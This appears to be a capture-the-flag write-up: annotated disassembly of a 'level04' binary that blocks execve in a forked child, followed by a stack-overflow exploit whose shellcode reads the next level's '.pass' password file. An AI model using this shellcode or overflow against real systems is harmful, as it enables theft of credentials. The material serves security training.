main : 
    0x080486c8 <+0>:     push   ebp
    0x080486c9 <+1>:     mov    ebp,esp
    0x080486cb <+3>:     push   edi
    0x080486cc <+4>:     push   ebx
    0x080486cd <+5>:     and    esp,0xfffffff0
    
    0x080486d0 <+8>:     sub    esp,0xb0 // alloue 176 octets
    0x080486d6 <+14>:    call   0x8048550 <fork@plt> // call fork

    0x080486db <+19>:    mov    DWORD PTR [esp+0xac],eax // met eax dans esp +172 (var pid) 
    0x080486e2 <+26>:    lea    ebx,[esp+0x20] // charge esp +32 dans ebx
    0x080486e6 <+30>:    mov    eax,0x0 // met eax a 0
    0x080486eb <+35>:    mov    edx,0x20 // met 32 dans edx 
    0x080486f0 <+40>:    mov    edi,ebx // met esp +32 dans edi (destination)
    0x080486f2 <+42>:    mov    ecx,edx // met 32 dans ecx (compteur)
    0x080486f4 <+44>:    rep stos 2DWORD PTR es:[edi],eax // prend l'adresse esp + 32 et remplis de 32 * 4 octets (128)
    0x080486f6 <+46>:    mov    DWORD PTR [esp+0xa8],0x0 // met esp + 168 a 0
    0x08048701 <+57>:    mov    DWORD PTR [esp+0x1c],0x0 //met esp + 28 a 0
   
    0x08048709 <+65>:    cmp    DWORD PTR [esp+0xac],0x0 // compare esp + 172 a 0 
    0x08048711 <+73>:    jne    0x8048769 <main+161> // si esp +172 différent de 0 jump a +161

    0x08048713 <+75>:    mov    DWORD PTR [esp+0x4],0x1 // arg1 = 1
    0x0804871b <+83>:    mov    DWORD PTR [esp],0x1 arg0 = 1
    0x08048722 <+90>:    call   0x8048540 <prctl@plt> // call prctl

    0x08048727 <+95>:    mov    DWORD PTR [esp+0xc],0x0 // arg3 = 0
    0x0804872f <+103>:   mov    DWORD PTR [esp+0x8],0x0 // arg2 = 0
    0x08048737 <+111>:   mov    DWORD PTR [esp+0x4],0x0 // arg1 = 0
    0x0804873f <+119>:   mov    DWORD PTR [esp],0x0 // arg0 = 0
    0x08048746 <+126>:   call   0x8048570 <ptrace@plt> // call ptrace

    0x0804874b <+131>:   mov    DWORD PTR [esp],0x8048903 // arg0 = "Give me some shellcode, k"
    0x08048752 <+138>:   call   0x8048500 <puts@plt> //call puts

    0x08048757 <+143>:   lea    eax,[esp+0x20] // met esp + 32 dan eax
    0x0804875b <+147>:   mov    DWORD PTR [esp],eax // arg0 = esp +32 (buff)
    0x0804875e <+150>:   call   0x80484b0 <gets@plt> // call gets 

    0x08048763 <+155>:   jmp    0x804881a <main+338>

    0x08048768 <+160>:   nop
    0x08048769 <+161>:   lea    eax,[esp+0x1c] // met status dans eax
    0x0804876d <+165>:   mov    DWORD PTR [esp],eax // arg0 = status
    0x08048770 <+168>:   call   0x80484f0 <wait@plt> // call wait

    0x08048775 <+173>:   mov    eax,DWORD PTR [esp+0x1c] // met status dans eax
    0x08048779 <+177>:   mov    DWORD PTR [esp+0xa0],eax // met status dans esp + 160
    0x08048780 <+184>:   mov    eax,DWORD PTR [esp+0xa0] // met status dans eax
    0x08048787 <+191>:   and    eax,0x7f // utilise la macro WIFEXITED
    0x0804878a <+194>:   test   eax,eax // verifie si eax vaut 0
    0x0804878c <+196>:   je     0x80487ac <main+228> // si eax vaut 0 go +228

    0x0804878e <+198>:   mov    eax,DWORD PTR [esp+0x1c] // met status dans eax
    0x08048792 <+202>:   mov    DWORD PTR [esp+0xa4],eax // met status dans esp + 164
    0x08048799 <+209>:   mov    eax,DWORD PTR [esp+0xa4] // met status dans eax
    0x080487a0 <+216>:   and    eax,0x7f // utilise la macro WIFEXITED
    0x080487a3 <+219>:   add    eax,0x1 // ajoute 1
    0x080487a6 <+222>:   sar    al,1 // shift right 1 fois
    0x080487a8 <+224>:   test   al,al // WIFSIGNALED(status)
    0x080487aa <+226>:   jle    0x80487ba <main+242> // si WIFSIGNALED != 0 jump +242

    0x080487ac <+228>:   mov    DWORD PTR [esp],0x804891d // arg0 = "child is exiting..."
    0x080487b3 <+235>:   call   0x8048500 <puts@plt> // call puts

    0x080487b8 <+240>:   jmp    0x804881a <main+338>

    0x080487ba <+242>:   mov    DWORD PTR [esp+0xc],0x0 // arg3 = 0
    0x080487c2 <+250>:   mov    DWORD PTR [esp+0x8],0x2c // arg2 = 44 => ORIG_EAX (11 * 4 = 44)
    0x080487ca <+258>:   mov    eax,DWORD PTR [esp+0xac] //  recupere pid et le met dans eax
    0x080487d1 <+265>:   mov    DWORD PTR [esp+0x4],eax // arg1=  pid
    0x080487d5 <+269>:   mov    DWORD PTR [esp],0x3 // arg0 = 3 => PTRACE_PEEKUSER
    0x080487dc <+276>:   call   0x8048570 <ptrace@plt> // call ptrace

    boucle
    0x080487e1 <+281>:   mov    DWORD PTR [esp+0xa8],eax // met eax dans value
    0x080487e8 <+288>:   cmp    DWORD PTR [esp+0xa8],0xb // compare value avec 11 
    0x080487f0 <+296>:   jne    0x8048768 <main+160> // si c'est différent retourne a l'instruction 160

    0x080487f6 <+302>:   mov    DWORD PTR [esp],0x8048931 //arg0 = "no exec() for you"
    0x080487fd <+309>:   call   0x8048500 <puts@plt> // call puts

    0x08048802 <+314>:   mov    DWORD PTR [esp+0x4],0x9 // arg1 = 9 => SIGKILL
    0x0804880a <+322>:   mov    eax,DWORD PTR [esp+0xac] // met pid dans eax
    0x08048811 <+329>:   mov    DWORD PTR [esp],eax // arg0 = pid
    0x08048814 <+332>:   call   0x8048520 <kill@plt> // call kill
    
    0x08048819 <+337>:   nop
    0x0804881a <+338>:   mov    eax,0x0 // return 0;
    0x0804881f <+343>:   lea    esp,[ebp-0x8]
    0x08048822 <+346>:   pop    ebx
    0x08048823 <+347>:   pop    edi
    0x08048824 <+348>:   pop    ebp
    0x08048825 <+349>:   ret 

python -c 'print "\x90" * 90 + "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff" + "/home/users/level05/.pass"'

python -c 'print "\x90" * 156 + "\xf5\xde\xff\xff"' | ./level04